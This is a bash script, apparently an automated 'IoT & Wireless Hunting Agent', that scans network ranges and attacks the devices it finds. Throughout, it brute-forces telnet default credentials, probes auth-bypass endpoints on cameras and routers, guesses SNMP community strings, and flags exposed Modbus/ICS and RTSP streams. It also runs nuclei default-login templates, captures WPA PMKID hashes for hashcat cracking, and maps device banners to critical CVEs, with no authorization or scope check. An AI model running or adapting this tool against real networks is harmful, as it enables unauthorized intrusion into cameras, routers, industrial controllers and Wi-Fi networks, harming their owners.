#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════════════╗
# ║  ROXX'S SLAVE — IoT & WIRELESS HUNTING AGENT v14.1                  ║
# ║  Autonomous scanner for embedded devices, IoT, WiFi, RF             ║
# ║  Usage: bash iot-hunt.sh <target_ip_or_range> [target_id]           ║
# ╚══════════════════════════════════════════════════════════════════════╝

TARGET="${1:-}"
TID="${2:-global}"
FINDINGS="/home/roxx/findings"
IOT_DIR="${FINDINGS}/iot"
WIRELESS_DIR="${FINDINGS}/wireless"
DASHBOARD="http://localhost:1337"

[[ -z "$TARGET" ]] && { echo "Usage: $0 <ip/range/ssid> [target_id]"; exit 1; }

mkdir -p "$IOT_DIR" "$WIRELESS_DIR" "${FINDINGS}/targets/${TID}"
OUT="${FINDINGS}/targets/${TID}"

# ── Colors ────────────────────────────────────────────────────────
R=$'\e[1;31m'; G=$'\e[1;32m'; Y=$'\e[1;33m'; C=$'\e[1;36m'; M=$'\e[1;35m'; NC=$'\e[0m'; DM=$'\e[2m'

log()    { printf "${DM}[%s]${NC} ${G}[IoT-HUNT]${NC} %s\n" "$(date '+%H:%M:%S')" "$*"; }
warn()   { printf "${DM}[%s]${NC} ${Y}[WARN]${NC}     %s\n" "$(date '+%H:%M:%S')" "$*"; }
found()  { printf "${DM}[%s]${NC} ${R}[FOUND]${NC}    %s\n" "$(date '+%H:%M:%S')" "$*"; }
section(){ printf "\n${R}══════════════════════════════════════════════════════${NC}\n"; printf "${R}  ◈  %s${NC}\n" "$*"; printf "${R}══════════════════════════════════════════════════════${NC}\n\n"; }

# ── Dashboard API helpers ──────────────────────────────────────────
api_stage() {
  local stage="$1" prog="$2" status="${3:-running}" logmsg="${4:-}"
  curl -sfX POST "${DASHBOARD}/api/stage" \
    -H "Content-Type: application/json" \
    -d "{\"target_id\":\"${TID}\",\"stage\":\"${stage}\",\"progress\":${prog},\"status\":\"${status}\",\"log\":\"${logmsg}\"}" \
    >/dev/null 2>&1 || true
}

api_finding() {
  local title="$1" type="$2" sev="$3" url="$4" impact="$5"
  curl -sfX POST "${DASHBOARD}/api/finding" \
    -H "Content-Type: application/json" \
    -d "{\"target_id\":\"${TID}\",\"title\":\"$(echo $title|sed 's/"/\\"/g')\",\"type\":\"${type}\",\"severity\":\"${sev}\",\"url\":\"${url}\",\"impact\":\"$(echo $impact|sed 's/"/\\"/g')\"}" \
    >/dev/null 2>&1 || true
}

# ── Tool check ─────────────────────────────────────────────────────
need() { command -v "$1" &>/dev/null || { warn "$1 not found — install: apt-get install -y $1"; return 1; }; }

log "Target: ${TARGET} | TID: ${TID}"
log "Output: ${OUT}"

# ══════════════════════════════════════════════════════════════════════
# PHASE 1 — HOST DISCOVERY & PORT SCAN
# ══════════════════════════════════════════════════════════════════════
section "PHASE 1 — HOST DISCOVERY"
api_stage "iot" 5 "running" "Host discovery"

# Detect if target is a range, single IP, or hostname
if [[ "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
  # CIDR range — use nmap ping sweep
  log "CIDR range detected — running ping sweep"
  if need nmap; then
    nmap -sn "$TARGET" -oG "${OUT}/hosts.gnmap" 2>/dev/null | tee "${OUT}/host_discovery.txt"
    grep "Up" "${OUT}/hosts.gnmap" 2>/dev/null | awk '{print $2}' > "${OUT}/live_hosts.txt"
    HOST_COUNT=$(wc -l < "${OUT}/live_hosts.txt" 2>/dev/null || echo 0)
    log "Found ${HOST_COUNT} live hosts"
    api_stage "iot" 15 "running" "${HOST_COUNT} hosts discovered"
  fi
else
  echo "$TARGET" > "${OUT}/live_hosts.txt"
  HOST_COUNT=1
fi

# ══════════════════════════════════════════════════════════════════════
# PHASE 2 — IoT PORT SCAN (all IoT-relevant ports)
# ══════════════════════════════════════════════════════════════════════
section "PHASE 2 — IoT PORT SCAN"
api_stage "iot" 20 "running" "IoT port scan"

# IoT-specific ports:
# 23=telnet, 80/443/8080/8443=web UI, 554=RTSP (cameras), 9000=dahua,
# 4786=cisco smart install, 102=Siemens S7, 47808=BACnet, 44818=EtherNet/IP,
# 502=Modbus, 1883/8883=MQTT, 5683=CoAP, 161/162=SNMP, 2323=alt-telnet,
# 7547=TR-069, 37777=dahua NVR, 34567=dvr, 9527=hikvision, 8554=RTSP alt
IOT_PORTS="21,22,23,25,53,80,102,161,162,443,502,554,1883,2323,4786,5683,7547,8080,8443,8554,8883,9000,9527,34567,37777,44818,47808"

if need nmap; then
  log "Scanning IoT ports on all live hosts..."
  while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    log "Scanning: ${host}"
    nmap -sV -sC -p "$IOT_PORTS" --script "banner,http-title,snmp-info,telnet-ntlm-info,rtsp-url-brute" \
      --open -T4 "$host" \
      -oN "${OUT}/nmap_iot_${host//./_}.txt" \
      -oX "${OUT}/nmap_iot_${host//./_}.xml" 2>/dev/null
  done < "${OUT}/live_hosts.txt"
  api_stage "iot" 35 "running" "IoT port scan complete"
fi

# ══════════════════════════════════════════════════════════════════════
# PHASE 3 — SERVICE-SPECIFIC ATTACKS
# ══════════════════════════════════════════════════════════════════════
section "PHASE 3 — SERVICE ENUMERATION & ATTACKS"
api_stage "iot" 40 "running" "Service enumeration"

while IFS= read -r host; do
  [[ -z "$host" ]] && continue
  log "Enumerating services on: ${host}"

  # ── Telnet check (default creds) ──────────────────────────────
  if timeout 3 bash -c "echo '' | nc -w 2 $host 23" 2>/dev/null | grep -qi "login\|password\|>"; then
    found "TELNET OPEN: ${host}:23"
    echo "TELNET_OPEN ${host}:23" >> "${IOT_DIR}/telnet_open.txt"
    api_finding "Telnet Open Port" "IoT_TELNET_OPEN" "HIGH" "${host}:23" "Telnet service exposed — test default creds"
    # Try common default creds
    for cred in "admin:admin" "admin:password" "admin:1234" "admin:" "root:root" "root:admin" "root:" "user:user" "admin:admin123"; do
      u="${cred%%:*}"; p="${cred##*:}"
      if timeout 5 bash -c "echo -e '${u}\n${p}\nwhoami\n' | nc -w 3 ${host} 23" 2>/dev/null | grep -q "$"; then
        found "TELNET DEFAULT CRED: ${host} — ${u}:${p}"
        echo "TELNET_DEFAULT_CRED ${host} user=${u} pass=${p}" >> "${IOT_DIR}/default_creds.txt"
        api_finding "Telnet Default Credential" "IoT_DEFAULT_CREDS" "CRITICAL" "${host}:23" "Login: ${u}:${p}"
      fi
    done
  fi

  # ── HTTP/HTTPS web interface ───────────────────────────────────
  for port in 80 8080 443 8443 8554 9000 9527; do
    proto="http"; [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    url="${proto}://${host}:${port}"
    resp=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    [[ "$resp" == "000" ]] && continue
    log "Web UI found: ${url} [${resp}]"
    title=$(curl -sk --max-time 5 "$url" 2>/dev/null | grep -oi '<title>[^<]*</title>' | sed 's/<[^>]*>//g' | head -1)
    echo "${url} [${resp}] ${title}" >> "${OUT}/web_interfaces.txt"

    # Check for known default login pages
    body=$(curl -sk --max-time 8 "$url" 2>/dev/null)
    for sig in "DVR" "NVR" "Camera" "Hikvision" "Dahua" "TP-Link" "D-Link" "Netgear" "Asus" "MikroTik" "Ubiquiti" "UniFi" "Axis" "Bosch" "router" "gateway" "modem" "Cisco" "Juniper"; do
      if echo "$body" | grep -qi "$sig"; then
        found "DEVICE IDENTIFIED: ${url} — ${sig}"
        echo "${url} device=${sig}" >> "${IOT_DIR}/identified_devices.txt"
        api_finding "IoT Device Web Interface: ${sig}" "IoT_UNAUTH_API" "HIGH" "$url" "Device type ${sig} web interface exposed"
      fi
    done

    # Auth bypass checks
    for bypass_path in "/cgi-bin/nobody/Machine.cgi" "/cgi-bin/main-cgi" "/setup.cgi" "/admin/" \
                       "/ISAPI/Security/userCheck" "/api/v1/config" "/api/system/deviceinfo" \
                       "/device.rsp?opt=sys&cmd=sysinfo" "/cgi-bin/hi3510/param.cgi"; do
      code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "${url}${bypass_path}" 2>/dev/null)
      if [[ "$code" =~ ^2 ]]; then
        found "UNAUTH ENDPOINT: ${url}${bypass_path} [${code}]"
        curl -sk --max-time 5 "${url}${bypass_path}" > "${IOT_DIR}/unauth_${host//./_}_${port}.txt" 2>/dev/null
        api_finding "Unauthenticated IoT API" "IoT_UNAUTH_API" "CRITICAL" "${url}${bypass_path}" "200 response without auth — data exposed"
      fi
    done
  done

  # ── SNMP enumeration ──────────────────────────────────────────
  if need snmpwalk; then
    for community in "public" "private" "admin" "community" "cisco" "default"; do
      result=$(timeout 5 snmpwalk -v2c -c "$community" "$host" 1.3.6.1.2.1.1.1.0 2>/dev/null)
      if [[ -n "$result" ]]; then
        found "SNMP COMMUNITY: ${host} — community=${community}"
        snmpwalk -v2c -c "$community" "$host" 2>/dev/null > "${IOT_DIR}/snmp_${host//./_}_${community}.txt"
        echo "${host} community=${community}" >> "${IOT_DIR}/snmp_communities.txt"
        api_finding "SNMP Default Community String" "IoT_UNAUTH_API" "HIGH" "${host}:161" "Community: ${community}"
        break
      fi
    done
  fi

  # ── MQTT check ────────────────────────────────────────────────
  for mqttport in 1883 8883; do
    if timeout 3 bash -c "echo '' | nc -w 2 $host $mqttport" 2>/dev/null | strings | grep -q "CONNACK\|MQTT\|Protocol"; then
      found "MQTT OPEN: ${host}:${mqttport}"
      echo "${host}:${mqttport}" >> "${IOT_DIR}/mqtt_open.txt"
      api_finding "MQTT Broker Exposed" "IoT_UNAUTH_API" "HIGH" "${host}:${mqttport}" "MQTT broker without auth — subscribe to all topics"
    fi
  done

  # ── Modbus (ICS/SCADA) ────────────────────────────────────────
  if timeout 3 bash -c "echo '' | nc -w 2 $host 502" 2>/dev/null | wc -c | grep -qv "^0$"; then
    found "MODBUS OPEN: ${host}:502 — ICS/SCADA DEVICE"
    echo "${host}:502 MODBUS" >> "${IOT_DIR}/ics_devices.txt"
    api_finding "Modbus/ICS Device Exposed" "IoT_UNAUTH_API" "CRITICAL" "${host}:502" "ICS/SCADA Modbus — unauthenticated read/write possible"
  fi

  # ── RTSP camera streams ───────────────────────────────────────
  for rtspport in 554 8554; do
    if timeout 3 bash -c "echo '' | nc -w 2 $host $rtspport" 2>/dev/null | grep -qi "RTSP\|200 OK"; then
      found "RTSP STREAM: ${host}:${rtspport}"
      echo "${host}:${rtspport}" >> "${IOT_DIR}/rtsp_cameras.txt"
      # Try common stream paths
      for path in "/" "/live" "/h264" "/cam/realmonitor?channel=1&subtype=0" "/Streaming/Channels/1"; do
        echo "rtsp://${host}:${rtspport}${path}" >> "${IOT_DIR}/rtsp_urls.txt"
      done
      api_finding "RTSP Camera Stream Exposed" "IoT_UNAUTH_API" "HIGH" "rtsp://${host}:${rtspport}" "Camera stream may be unauthenticated"
    fi
  done

done < "${OUT}/live_hosts.txt"

api_stage "iot" 60 "running" "Service attacks complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 4 — NUCLEI IoT TEMPLATES
# ══════════════════════════════════════════════════════════════════════
section "PHASE 4 — NUCLEI IoT/NETWORK TEMPLATES"
api_stage "iot" 65 "running" "Nuclei IoT scan"

if need nuclei; then
  while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    for proto in "http" "https"; do
      for port in 80 8080 443 8443; do
        url="${proto}://${host}:${port}"
        resp=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        [[ "$resp" == "000" ]] && continue
        log "Nuclei IoT scan: ${url}"
        nuclei -u "$url" \
          -t /root/nuclei-templates/iot/ \
          -t /root/nuclei-templates/network/ \
          -t /root/nuclei-templates/default-logins/ \
          -t /root/nuclei-templates/exposed-panels/ \
          -severity high,critical \
          -silent \
          -o "${IOT_DIR}/nuclei_${host//./_}_${port}.txt" 2>/dev/null | tee -a "${OUT}/nuclei_iot_all.txt"
        # Parse and report findings
        if [[ -s "${IOT_DIR}/nuclei_${host//./_}_${port}.txt" ]]; then
          while IFS= read -r line; do
            found "NUCLEI: ${line}"
            api_finding "Nuclei IoT Finding" "IoT_FIRMWARE" "CRITICAL" "$url" "$line"
          done < "${IOT_DIR}/nuclei_${host//./_}_${port}.txt"
        fi
      done
    done
  done < "${OUT}/live_hosts.txt"
fi

api_stage "iot" 80 "running" "Nuclei complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 5 — WIRELESS HUNTING
# ══════════════════════════════════════════════════════════════════════
section "PHASE 5 — WIRELESS / RF ANALYSIS"
api_stage "iot" 85 "running" "Wireless analysis"

# Detect wireless interface
WLAN=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | head -1 || echo "")
if [[ -z "$WLAN" ]]; then
  warn "No wireless interface detected — skipping active wireless tests"
  warn "For wireless hunting: plug in WiFi adapter and re-run"
else
  log "Wireless interface: ${WLAN}"

  # Passive scan
  log "Starting passive WiFi scan (5s)..."
  if need iwlist; then
    iwlist "$WLAN" scan 2>/dev/null > "${WIRELESS_DIR}/wifi_scan.txt"
    # Parse open networks
    python3 -c "
import re, sys
data = open('${WIRELESS_DIR}/wifi_scan.txt').read()
cells = data.split('Cell ')
for c in cells[1:]:
    ssid = re.search(r'ESSID:\"(.+?)\"', c)
    enc  = re.search(r'Encryption key:(on|off)', c)
    sig  = re.search(r'Signal level=(.+?) dBm', c)
    bssid= re.search(r'Address: (.+)', c)
    if ssid:
        print(f\"{'OPEN' if enc and enc.group(1)=='off' else 'ENC '} | {bssid.group(1) if bssid else '?'} | {sig.group(1) if sig else '?'}dBm | {ssid.group(1)}\")
" 2>/dev/null | tee "${WIRELESS_DIR}/networks_parsed.txt"

    # Report open networks
    while IFS= read -r line; do
      if echo "$line" | grep -q "^OPEN"; then
        found "OPEN WIFI NETWORK: ${line}"
        echo "$line" >> "${WIRELESS_DIR}/open_networks.txt"
        ssid=$(echo "$line" | awk -F'|' '{print $4}' | xargs)
        api_finding "Open WiFi Network" "WIRELESS_DEAUTH" "HIGH" "ssid:${ssid}" "Open network — no WPA encryption"
      fi
    done < "${WIRELESS_DIR}/networks_parsed.txt"
  fi

  # Check for WPS-enabled networks (WPS attacks)
  if need wash; then
    log "Scanning for WPS-enabled networks..."
    timeout 10 wash -i "$WLAN" --ignore-fcs 2>/dev/null > "${WIRELESS_DIR}/wps_scan.txt"
    if [[ -s "${WIRELESS_DIR}/wps_scan.txt" ]]; then
      WPS_COUNT=$(wc -l < "${WIRELESS_DIR}/wps_scan.txt")
      found "${WPS_COUNT} WPS-enabled networks found"
      api_finding "WPS-Enabled Networks Detected" "WIRELESS_PMKID" "HIGH" "wireless" "${WPS_COUNT} networks with WPS enabled — Pixie Dust / PIN attack possible"
    fi
  fi

  # PMKID capture (clientless WPA attack)
  if need hcxdumptool; then
    log "Attempting PMKID capture (15s passive)..."
    timeout 15 hcxdumptool -i "$WLAN" -o "${WIRELESS_DIR}/pmkid.pcapng" \
      --enable_status=1 2>/dev/null || true
    if [[ -s "${WIRELESS_DIR}/pmkid.pcapng" ]]; then
      log "PCAPNG captured — converting for hashcat..."
      if need hcxpcapngtool; then
        hcxpcapngtool -o "${WIRELESS_DIR}/pmkid.hash" "${WIRELESS_DIR}/pmkid.pcapng" 2>/dev/null
        COUNT=$(wc -l < "${WIRELESS_DIR}/pmkid.hash" 2>/dev/null || echo 0)
        if [[ "$COUNT" -gt 0 ]]; then
          found "PMKID HASHES CAPTURED: ${COUNT}"
          api_finding "WPA PMKID Hash Captured" "WIRELESS_PMKID" "HIGH" "wireless" "${COUNT} PMKID hashes — crack with: hashcat -m 22000 pmkid.hash wordlist.txt"
          echo "# Crack with: hashcat -m 22000 ${WIRELESS_DIR}/pmkid.hash /usr/share/wordlists/rockyou.txt" \
            >> "${WIRELESS_DIR}/pmkid.hash"
        fi
      fi
    fi
  fi
fi

# ══════════════════════════════════════════════════════════════════════
# PHASE 6 — FIRMWARE & CVE CHECK
# ══════════════════════════════════════════════════════════════════════
section "PHASE 6 — FIRMWARE VERSION & CVE CORRELATION"
api_stage "iot" 92 "running" "Firmware CVE check"

# Extract versions from nmap results and check against known CVEs
cat "${OUT}"/nmap_iot_*.txt 2>/dev/null | grep -E "product:|version:|CPE" | sort -u > "${OUT}/software_versions.txt"

# Known critical IoT CVEs to check banners against
declare -A IOT_CVES=(
  ["Hikvision"]="CVE-2021-36260 — Unauthenticated RCE — CRITICAL 9.8"
  ["Dahua"]="CVE-2021-33044 — Auth bypass — CRITICAL 9.8"
  ["Netgear"]="CVE-2022-27646 — RCE — CRITICAL 9.8"
  ["D-Link"]="CVE-2022-26258 — RCE — CRITICAL 9.8"
  ["MikroTik"]="CVE-2018-14847 — Winbox creds leak — CRITICAL 9.1"
  ["Cisco"]="CVE-2023-20198 — IOS XE auth bypass — CRITICAL 10.0"
  ["TP-Link"]="CVE-2023-1389 — RCE — CRITICAL 9.8"
  ["Netgear"]="CVE-2021-45732 — Auth bypass — CRITICAL 9.8"
  ["Axis"]="CVE-2018-10660 — OS command injection — CRITICAL 9.8"
  ["BACnet"]="CVE-2023-29546 — Protocol abuse — HIGH 8.1"
  ["Modbus"]="CVE-2019-13556 — No auth — CRITICAL 9.1"
  ["Draytek"]="CVE-2024-41592 — Buffer overflow RCE — CRITICAL 10.0"
)

for device in "${!IOT_CVES[@]}"; do
  if grep -qi "$device" "${IOT_DIR}/identified_devices.txt" 2>/dev/null || \
     grep -qi "$device" "${OUT}/web_interfaces.txt" 2>/dev/null || \
     grep -qi "$device" "${OUT}"/nmap_iot_*.txt 2>/dev/null; then
    found "CVE MATCH: ${device} — ${IOT_CVES[$device]}"
    echo "${device}: ${IOT_CVES[$device]}" >> "${IOT_DIR}/cve_matches.txt"
    cve=$(echo "${IOT_CVES[$device]}" | grep -o 'CVE-[0-9-]*')
    api_finding "${device} ${cve}" "IoT_FIRMWARE" "CRITICAL" "$device" "${IOT_CVES[$device]}"
  fi
done

# ══════════════════════════════════════════════════════════════════════
# PHASE 7 — SUMMARY REPORT
# ══════════════════════════════════════════════════════════════════════
section "PHASE 7 — HUNT SUMMARY"
api_stage "iot" 100 "done" "Hunt complete"

REPORT="${IOT_DIR}/hunt_report_$(date +%Y%m%d_%H%M%S).md"
{
  echo "# ROXX'S SLAVE — IoT/Wireless Hunt Report"
  echo "**Target:** ${TARGET} | **TID:** ${TID} | **Date:** $(date)"
  echo ""
  echo "## Live Hosts"
  cat "${OUT}/live_hosts.txt" 2>/dev/null || echo "None"
  echo ""
  echo "## Web Interfaces Found"
  cat "${OUT}/web_interfaces.txt" 2>/dev/null || echo "None"
  echo ""
  echo "## Default Credentials"
  cat "${IOT_DIR}/default_creds.txt" 2>/dev/null || echo "None found"
  echo ""
  echo "## Unauthenticated Endpoints"
  ls "${IOT_DIR}"/unauth_*.txt 2>/dev/null | head -20 || echo "None"
  echo ""
  echo "## CVE Matches"
  cat "${IOT_DIR}/cve_matches.txt" 2>/dev/null || echo "None matched"
  echo ""
  echo "## RTSP Camera Streams"
  cat "${IOT_DIR}/rtsp_cameras.txt" 2>/dev/null || echo "None"
  echo ""
  echo "## SNMP Communities"
  cat "${IOT_DIR}/snmp_communities.txt" 2>/dev/null || echo "None"
  echo ""
  echo "## Wireless Networks"
  cat "${WIRELESS_DIR}/networks_parsed.txt" 2>/dev/null || echo "No wireless scan"
  echo ""
  echo "## PMKID Hashes"
  cat "${WIRELESS_DIR}/pmkid.hash" 2>/dev/null | head -10 || echo "None captured"
} > "$REPORT"

log "Report saved: ${REPORT}"
printf "\n${R}══ HUNT COMPLETE ══${NC}\n"
printf "${G}✔${NC} Report: ${REPORT}\n"
printf "${G}✔${NC} Findings: ${IOT_DIR}/\n"
printf "${G}✔${NC} Dashboard: ${DASHBOARD}\n\n"
